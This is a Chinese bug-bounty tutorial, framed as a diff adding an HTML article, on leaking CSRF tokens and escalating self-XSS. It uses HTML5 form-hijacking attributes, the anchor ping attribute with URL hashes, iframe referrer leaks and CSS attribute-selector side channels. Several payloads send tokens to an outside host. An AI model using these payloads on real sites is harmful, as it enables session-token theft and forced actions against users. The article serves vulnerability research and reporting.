@@ -1,0 +1,148 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="7f830025cb1749e13882d6b26d4e9b64">前言</h2>
+<p>如果说一个产品RCE漏洞相对描述是“一语中的”、“一发入魂”的杀气，想必各大厂商在对杀气感知和处理上总是最快最灵敏的，从各大专有SRC对报告的反映速度、修复速度、挖掘难易程度来说，也很好的佐证了这一点。log里保存着任何服务器接收到的数据原文随时溯源当场处理爱憎分明、系统环境在被攻击时的奇怪变化一看便知，一个好的RCE确实是无敌的，至少在被受攻击者审计出来前，高效便捷准确有效。但它一旦被使用，变会在厂商眼皮下留下“挨打痕迹”。</p>
+<p>另一对立面的“面向用户攻击”就没RCE那么方便了，比如一个简单的xss或者csrf的利用，虽然可以在不侵入和损坏框架主体的情况下触发，但需要用户少许的参与，增加了攻击的难度和不确定性。but!!话说回来这种不确定性和非侵入性的攻击方式，也正是它的优势所在：在用户主动反馈或者直接以运营方为攻击目标以外，即使发动攻击也极难被察觉或发现痕迹。（这就跟出老千与截胡的区别一样，出千时需要破坏牌的动作或在牌桌上做手脚留下痕迹，而截胡只需要在正常流程前完成攻击即可）</p>
+<blockquote>
+<p>教挖洞、教blablabla那些真没用，挖bounty真的很靠个人对业务理解和最终实现手法的，所以请注意，本文主要解释遇到利用链瓶颈时，如何合理结合新特性、框架特征、原有逻辑等帮助你提升和完成整个利用，而不会对你怎么快速挖到xss怎么速挖SRC项目有任何帮助，总而言之很明确说就是对新手不友好，很多前期知识得自己去搜。对，我就是懒得写咋的吧。</p>
+</blockquote>
+<h2 data-content="1" id="3cec423b8c40e1a02f594cb2aadf7103">常规csrf-token位置与获取方法</h2>
+<ol>
+<li>cookie中</li>
+<li>form表单</li>
+<li>URL参数</li>
+</ol>
+<p>首当其冲当然是cookie中的token，看似无解但实际有xss的环境便可，目前并没看到把token做http-only的。如果从cookie中提取再动态构造表单那没法获取了，单是验证cookie内容的话，怎么可能嘛csrf-token毕竟就是防csrf发生的。如果拥有xss肯定容易拿到cookie里的token，当然在其他能发出流量并得到返回值的情况中通过fetch重新获取一个也可以，普通原理这里不做过多说明了。</p>
+<h3 data-content="1" id="2aa87340dc731186f75f7b03bca62f65">form表单中的token</h3>
+<p>如果碰到token处于input中请莫慌，使用xss自然是很容易拿到标签中的value属性，但是如果一个页面能够注入DOM但无法找到有效的dom-xss-payload时，你就需要一个骚气的泄露token姿势了。</p>
+<p>我们来看一个例子：</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">"user-edit"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span> <span class="na">action</span><span class="o">=</span><span class="s">"/user/edit"</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"token"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">value</span><span class="o">=</span><span class="s">"csrf-xxxx1234"</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"notes"</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">value</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"secert"</span> <span class="na">type</span><span class="o">=</span><span class="s">"radio"</span><span class="p">&gt;</span>secert
+  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"public"</span> <span class="na">type</span><span class="o">=</span><span class="s">"radio"</span><span class="p">&gt;</span>public
+  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"save"</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>user's note blablabla...<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</pre></div>
+<p>假设你在这个页面找到个DOM类型的self-xss，不过有这样的限制区别：</p>
+<ul>
+<li>如果用户提交secert类别的内容，那页面将保留所有原始DOM，但限制仅能自己查看和触发，其他人看不到这条note的内容。</li>
+<li>但如果你发布的public文本内容，文本则可以公开给所有人浏览，不过危险的event和用于危险的标签DOM全被waf过滤了。</li>
+</ul>
+<p>这时候，如果直接提交个self-xss报告确实略显单薄，官方给个忽略也不过分嘛，毕竟无法造成实质性的对<strong>其他用户/指定用户</strong>造成攻击影响（叽己打叽己可木有用啊熊迪）。</p>
+<p>那如何将self升级成任意可以触发的xss就是关键拿分点，哪怕也忽略至少你可以让审核都觉得这思路骚暴，武力值+10。</p>
+<p>我们来看看html5特性里给表单带来的新玩意儿：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20200108104350-b376ecba-31c0-1.png"/></p>
+<p>这个时候思路变逐渐明了，只要尝试劫持表单让用户主动创建一个secert类型的note，就能让self-xss变成thatUser-self-xss了，虽不是任意触发，但我用self-xss一次打一个用户，也算定向攻击嘛。</p>
+<p>首先测试一下，构造一个public的payload且只需一行，完成劫持user-edit的表单：</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">form</span><span class="o">=</span><span class="s">"user-edit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"hijack"</span><span class="p">&gt;</span>
+</pre></div>
+<p>发布后发现，虽然是用户编辑出来的一个input标签，但在其他用户点击的情况下，成功触发了他所在页面的正常表单。要是这个表单是user-delete，那可真就是。。号没了警告.jpg。完成从其他按钮触发页面本来的表单后，我们使用其他<code>form*</code>属性来劫持修改表单值：</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">form</span><span class="o">=</span><span class="s">"user-edit"</span> <span class="na">name</span><span class="o">=</span><span class="s">"notes"</span> <span class="na">value</span><span class="o">=</span><span class="s">"[xss-payload-here]"</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">form</span><span class="o">=</span><span class="s">"user-edit"</span> <span class="na">name</span><span class="o">=</span><span class="s">"secert"</span> <span class="na">value</span><span class="o">=</span><span class="s">"on"</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">form</span><span class="o">=</span><span class="s">"user-edit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"hijack"</span><span class="p">&gt;</span>
+</pre></div>
+<p>可见，在用户点击后，我们成功把以上的可控表单内容注入到了本来页面中id为user-edit的表单里，完成劫持主动触发。而GET也好POST也罢，我们都知道只取最后一个同名的传入值，可以测试<code>echo $_GET["a"]</code>然后访问<code>/?a=1&amp;a=2&amp;a=3</code>，最终我们只能取到最后一个传入<code>a=3</code>，所以不用管表单里原来的内容，通过input属性劫持form我们就能成功直接覆盖原来的值。所以如果还在考虑类型默认是点击在<code>public</code>上这种情况？顺理成章我们加一个<code>&lt;input type="text" form="user-edit" name="public" value="off"&gt;</code>把<code>public</code>覆盖成<code>off</code>即可 :P</p>
+<p>再其次，有没有其他触发方式？当然有鸭~我们可以改变<code>action</code>直接把所有input的value都带出到外部服务器。</p>
+<ol>
+<li>我们可以先只尝试拿到token，在进行其他操作：</li>
+</ol>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">form</span><span class="o">=</span><span class="s">"user-edit"</span> <span class="na">formaction</span><span class="o">=</span><span class="s">"https://evil7.cn"</span> <span class="na">formmethod</span><span class="o">=</span><span class="s">"GET"</span> <span class="na">value</span><span class="o">=</span><span class="s">"hijack"</span><span class="p">&gt;</span>
+</pre></div>
+<ol>
+<li>页面还存在iframe，且iframe的URL里同时拼接了token为query参数，我们也能这样通过iframe内部框架的跳转带来的referrer属性获取token：</li>
+</ol>
+<p>比如：</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">"title_frame"</span> <span class="na">src</span><span class="o">=</span><span class="s">"/index?token=xxxx1234"</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">"user-edit"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span> <span class="na">action</span><span class="o">=</span><span class="s">"/user/edit"</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"token"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">value</span><span class="o">=</span><span class="s">"csrf-xxxx1234"</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"notes"</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">value</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"secert"</span> <span class="na">type</span><span class="o">=</span><span class="s">"radio"</span><span class="p">&gt;</span>secert
+  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"public"</span> <span class="na">type</span><span class="o">=</span><span class="s">"radio"</span><span class="p">&gt;</span>public
+  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"save"</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">formtarget</span><span class="o">=</span><span class="s">"title_frame"</span> <span class="na">formaction</span><span class="o">=</span><span class="s">"https://evil7.cn"</span> <span class="na">formmethod</span><span class="o">=</span><span class="s">"GET"</span> <span class="na">value</span><span class="o">=</span><span class="s">"hijack"</span><span class="p">&gt;</span>
+</pre></div>
+<p>虽然a标签的行为可能被代理跳转或安全处理了no-referrer属性，但通过找到一个没有sandbox和其他安全限制的iframe来劫持为form的<code>target</code>，就成功绕过了URL带出token的referrer限制。</p>
+<h3 data-content="1" id="2bede553b8b14f4160251a244a95d2cd">URL参数中的token</h3>
+<ol>
+<li>通过A标签获取</li>
+</ol>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"https://evil7.cn"</span><span class="p">&gt;</span>get_token<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</pre></div>
+<p>通过a标签跳转，我们能轻易从referrer中得到URL里拼接的token，但就目前看来稍有安全意识的开发，绝对会带上no-referrer属性，或者通过safe_jump_url的某些检查方式通过一个没有token的301页面或短链接转化，来脱敏并代为跳转。</p>
+<p>那解决方案除了如上所述，通过input劫持我们能在iframe中跳转内部页面巧妙的拿到referrer中的URL，其实还有一个html5的新属性和特殊处理可以利用——ping属性！</p>
+<p>好像没找到中文w3c属性介绍，可以看一下freebuf的文章<a href="https://www.freebuf.com/articles/network/74173.html" target="_blank">https://www.freebuf.com/articles/network/74173.html</a></p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"https://xz.aliyun.com/"</span> <span class="na">ping</span><span class="o">=</span><span class="s">"https://evil7.cn"</span><span class="p">&gt;</span>ping_leak<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</pre></div>
+<p>通过如上payload，我们能完成用户的行为跟踪。本来吧，这个ping属性就是用来统计点击或者跟踪行为的，但是实际你也可以用来盗取token。我们看看另外一个前端魔法：url-hash</p>
+<p>hash在URL中起到的作用是锚点，它会在用户点击后<strong>滚动页面导航到所在的位置，而不是跳转刷新当前页面</strong>，因为hash锚点标签，其实只是用户浏览器的行为，并没有影响整个页面也没有新请求流量产生。</p>
+<p>但是！ping属性又是怎么工作的呢？</p>
+<p>ping属性在用户点击链接时，统计用户点击的内容发送到指定服务器，所以不管是否刷新跳转页面是否点击的是个锚点链接，<strong>只要有点击发生</strong>其实ping都是<strong>正常发出ping请求的</strong>，所以即使href中是个锚点不是链接，我们的server也能统计到用户点了什么（ping-from/ping-to）。同样，哪怕csp和waf做了一定的安全处理，让我们没法跨域情况实现获取到其他站点的<code>ping-from： https://domain.com/token=csrfxxxx1234</code>，我们也可以通过hash锚点，让链接指向实际为<code>https://domain.com/token=csrfxxxx1234#hash</code>的链接，hash不会破坏浏览器地址栏现有的链接，但我们完全可以在server上看到一条ping流量带出了ping-to属性，从而完成<strong>不破坏现有URL情况下，通过ping-to带出URL的内容</strong></p>
+<p>比如这样：</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"#ping-leak"</span> <span class="na">ping</span><span class="o">=</span><span class="s">"https://evil7.cn"</span><span class="p">&gt;</span>ping_leak<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</pre></div>
+<p>哪怕跨域情况ping-from丢失，我们也可通过带出有ping-to的访问请求得到token。所以即便进行了no-referrer处理，我们还是可以利用a标签的ping属性带出token的。</p>
+<h3 data-content="1" id="e1b6b4b72f305c12d64d5de491e4bc1a">偏方：CSS选择器侧信道方式获取</h3>
+<p>如果有<code>&lt;input name="token" value="csrf-xxxx1234"&gt;</code>这样的一个DOM，我们无法注入其他上述方式的DOM，或者干脆控制不了DOM，唯独例外却有一个style自定义功能，或者说CSS可控？那我们能做什么呢？</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
+<span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s2">"token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s2">"c"</span><span class="o">]</span> <span class="p">{</span>
+  <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="s2">"https://evil7.cn/css-leak?token_1=c"</span><span class="p">)</span>
+<span class="p">}</span>
+<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"token"</span> <span class="na">value</span><span class="o">=</span><span class="s">"csrf-xxxx1234"</span><span class="p">&gt;</span>
+</pre></div>
+<p>如上我们可以用xss选择器，选中name为token的并且value第一个字符为"c"的input元素，并将其background属性设置为一个外带流量，这样就能泄露出token的首个字符。</p>
+<p>一个个字符泄露，每一个都得多一次payload的修改，实施比较麻烦，但这样的选择器还有很多，还有很多可以利用的。我们来一起康康：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200108115450-9ea54944-31ca-1.png"/></p>
+<p>通过文档了解，我们可以通过<code>^=</code>选择开头也可以通过<code>$=</code>选择结尾，但css中一个同类属性会被同样的属性覆盖，那么我们有没有办法加快css选择器的侧信道露点速度呢？</p>
+<p>类似<code>:root</code>的伪类可以极大程度帮到我们，我们没法一次给<code>input[name="token"][value^="c"]</code>和<code>input[name="token"][value$="4"]</code>同时绑定两个不同的<code>background</code>属性，这是显而易见的（最新值覆盖原因），但是我们可以试着添加<code>:root</code>伪类属性，在符合条件情况下，给他的根元素设置<code>background</code>。这下，前后开工，效率成功提高一倍岂不美哉！？</p>
+<p>如果以上测试均成立了，并且发现目标可以添加<code>&lt;link&gt;</code>标签（或者有办法主动刷新页面）那就更方便了，免去多次发送payload每个字符单独爆破，直接自动刷新依次leak即可得出出整个token。</p>
+<h3 data-content="1" id="a2e24a3bea32ce26b01dab64544411a7">点到为止顺便发散一下思维</h3>
+<p>要是某天css里支持完全的直接正则呢？呵呵呵，那可不得了！你是不是说像这样</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200108153506-63fd0aba-31e9-1.png"/></p>
+<p>（实际上真就有这么骚，只是还得等。关键词 <code>css4 @document regexp()</code> 链接 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/@document" target="_blank">https://developer.mozilla.org/zh-CN/docs/Web/CSS/@document</a> ）</p>
+<p>当css4发布的那天，开发运维将会想起被css选择器中正则魔法支配的恐惧：</p>
+<p>demo:</p>
+<div class="highlight"><pre><span></span><span class="err">#</span> <span class="nt">泄露出token第1个字符</span>
+<span class="p">@</span><span class="k">document</span> <span class="nt">regexp</span><span class="o">(</span><span class="s2">"/token=a.*/"</span><span class="o">)</span> <span class="p">{</span>
+  <span class="nt">div</span><span class="p">:</span><span class="nd">nth-child</span><span class="o">(</span><span class="nt">1</span><span class="o">)</span> <span class="p">{</span> <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="s2">"https://evil7.cn/?token_1=a"</span><span class="p">)}</span>
+<span class="p">}</span>
+<span class="p">@</span><span class="k">document</span> <span class="nt">regexp</span><span class="o">(</span><span class="s2">"/token=b.*/"</span><span class="o">)</span> <span class="p">{</span>
+  <span class="nt">div</span><span class="p">:</span><span class="nd">nth-child</span><span class="o">(</span><span class="nt">1</span><span class="o">)</span> <span class="p">{</span> <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="s2">"https://evil7.cn/?token_1=b"</span><span class="p">)}</span>
+<span class="p">}</span>
+<span class="o">......</span>
+<span class="p">@</span><span class="k">document</span> <span class="nt">regexp</span><span class="o">(</span><span class="s2">"/token=z.*/"</span><span class="o">)</span> <span class="p">{</span>
+  <span class="nt">div</span><span class="p">:</span><span class="nd">nth-child</span><span class="o">(</span><span class="nt">1</span><span class="o">)</span> <span class="p">{</span> <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="s2">"https://evil7.cn/?token_1=z"</span><span class="p">)}</span>
+<span class="p">}</span>
+<span class="o">......</span>
+<span class="err">#</span> <span class="nt">泄露出token第2个字符</span>
+<span class="p">@</span><span class="k">document</span> <span class="nt">regexp</span><span class="o">(</span><span class="s2">"/token=.{2}a.*/"</span><span class="o">)</span> <span class="p">{</span>
+  <span class="nt">div</span><span class="p">:</span><span class="nd">nth-child</span><span class="o">(</span><span class="nt">1</span><span class="o">)</span> <span class="p">{</span> <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="s2">"https://evil7.cn/?token_2=a"</span><span class="p">)}</span>
+<span class="p">}</span>
+<span class="p">@</span><span class="k">document</span> <span class="nt">regexp</span><span class="o">(</span><span class="s2">"/token=.{2}b.*/"</span><span class="o">)</span> <span class="p">{</span>
+  <span class="nt">div</span><span class="p">:</span><span class="nd">nth-child</span><span class="o">(</span><span class="nt">1</span><span class="o">)</span> <span class="p">{</span> <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="s2">"https://evil7.cn/?token_2=b"</span><span class="p">)}</span>
+<span class="p">}</span>
+<span class="o">......</span>
+<span class="p">@</span><span class="k">document</span> <span class="nt">regexp</span><span class="o">(</span><span class="s2">"/token=.{2}z.*/"</span><span class="o">)</span> <span class="p">{</span>
+  <span class="nt">div</span><span class="p">:</span><span class="nd">nth-child</span><span class="o">(</span><span class="nt">1</span><span class="o">)</span> <span class="p">{</span> <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="s2">"https://evil7.cn/?token_2=z"</span><span class="p">)}</span>
+<span class="p">}</span>
+<span class="o">......</span>
+<span class="err">#</span> <span class="nt">泄露出token第3个字符</span>
+<span class="p">@</span><span class="k">document</span> <span class="nt">regexp</span><span class="o">(</span><span class="s2">"/token=.{3}a.*/"</span><span class="o">)</span> <span class="p">{</span>
+  <span class="nt">div</span><span class="p">:</span><span class="nd">nth-child</span><span class="o">(</span><span class="nt">3</span><span class="o">)</span> <span class="p">{</span> <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="s2">"https://evil7.cn/?token_3=a"</span><span class="p">)}</span>
+<span class="p">}</span>
+<span class="o">......</span>
+</pre></div>
+<p>于是乎，等css4来临之时，我们将可以直接通过css选择器中复杂正则操作，快速依次泄露整个token或者URL中其他关键信息 :P</p>
+<p>以上总结分享全来自实战报告，仅供巩固复习或拓展思路，具体细节相关队员知者自知，只求师傅们互相交流，其他方向薄弱环节顺道带带我，反正就hin棒棒了嘛~</p>
+<h2 data-content="1" id="a555279b24df570fde9f8de607111c09">后记</h2>
+<p>前端攻击的分类和评分一直为各位白帽子所诟病，selfxss就忽略？csrf就低危？不不不，单从漏洞评级上看确实如此，但从真实攻击的实施目的上看，他们能达到的效果其实是一样的，所以大家也要给SRC一些时间，等待评级细化区分成本评级、效果评级的多维度综合评级标准。目前看来，BAT的专属SRC已经进入按影响评级的思想高度，在任何手段下只要造成用户敏感信息泄露那就是敏感信息泄露、任何手段造成损坏用户权益的恶意操作都能有效评高分。</p>
+<p>所以各位白帽子也要结合项目内容、所出现漏洞的性质和实际影响来决定自评。好的报告 = 一个可靠的手法 + 一个清晰的攻击思路 + 一个模拟攻击场景 + 一份足量的危害证明</p>
+<p>拿分和申诉翻盘的根本告诉你了，以后看到小问题小bug先记下来，说不定哪天就来个《UI大小不一到0dayRCE内网漫游》。</p>
+<p>不管有没有进展，不管局势多么挠头，答应我，1v9也要坚持打下去！</p>
+</div>
+</div>
